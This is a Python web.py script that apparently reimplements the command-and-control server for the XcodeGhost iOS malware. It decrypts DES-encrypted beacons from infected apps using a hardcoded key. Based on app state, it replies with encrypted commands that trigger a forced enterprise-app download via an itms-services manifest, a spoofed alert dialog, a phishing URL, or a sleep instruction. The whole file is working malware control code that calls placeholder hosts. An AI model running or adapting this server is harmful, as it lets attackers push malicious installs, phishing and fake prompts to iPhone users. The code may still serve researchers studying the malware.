#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import web
from pyDes import * 
import binascii 
import json 
import re


urls = (
    '/', 'Xcode_ghost'
)


def format_hex(alert_res):
    des_decode = des("stringWi", ECB, IV=None, pad=None, padmode=PAD_PKCS5)
    str_hex = des_decode.encrypt(alert_res)

    alert_hex = '0065000a' + binascii.hexlify(str_hex)
    alert_len = hex((len(alert_hex)+8)/2)[2:]
    tmp = '0'*(8-len(alert_len)) + alert_len
    alert_finally = tmp + alert_hex
    res = binascii.a2b_hex(alert_finally)
    return res


def alert(): #alert
    print "alert()" 
    alert_res = '{"alertHeader":"titlemessage", \
    "alertBody":"bodymessage", \
    "appID":"0", \
    "cancelTitle":"cancel", \
    "confirmTitle":"OK", \
    "scheme":"mqqopensdkapiv2://qzapp"}'
    encodeAlert = format_hex(alert_res)
    return encodeAlert 


def download(): #download
    print "download" 
    download_res = '{"configUrl":"itms-services://?action=download-manifest&url=https://www.xxx.com/download.plist", \
    "scheme":"mqqopensdkapiv2://qzapp"}'
    encodeDownload = format_hex(download_res)
    return encodeDownload 


def phishing(): #phishing
    print "phishing" 
    phishing_res = '{"configUrl":"http://www.xxx.com", \
    "scheme":"mqqopensdkapiv2://qzapp"}'
    encodePhishing = format_hex(phishing_res)
    return encodePhishing


def suspend(): #sleep
    print "sleep"
    suspend = '{"sleep":"-36000000"}'
    encodeSuspend = format_hex(suspend)
    return encodeSuspend 


class Xcode_ghost:
    def POST(self):
        data = web.data()
        data_hex = binascii.b2a_hex(data)
        bodyLen = int(data_hex[0:8],16) 
        cmdLen = int(data_hex[8:12],16) 
        ver = int(data_hex[12:16],16) 

        des_decode = des("stringWi", ECB, IV=None, pad=None, padmode=PAD_PKCS5) 
        decode = des_decode.decrypt(data) 
        jsonDecode = '{' + ''.join(re.findall("{([\s\S]*?)}",decode)).strip() + '}' 
        print "\n\nbodyLen:",bodyLen,"cmdLen:",cmdLen,"ver:",ver,"\n",jsonDecode,"\n"
        jsonLoad = json.loads(jsonDecode) 
        print 'status:' , jsonLoad["status"]

        if jsonLoad["status"] == "launch": 
            # response = phishing()
            response = download()
            print response
        elif jsonLoad["status"] == "resignActive": 
            response = alert() 
            print response
        elif jsonLoad["status"] == "suspend": 
            response = suspend()
            print response

        return response


if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()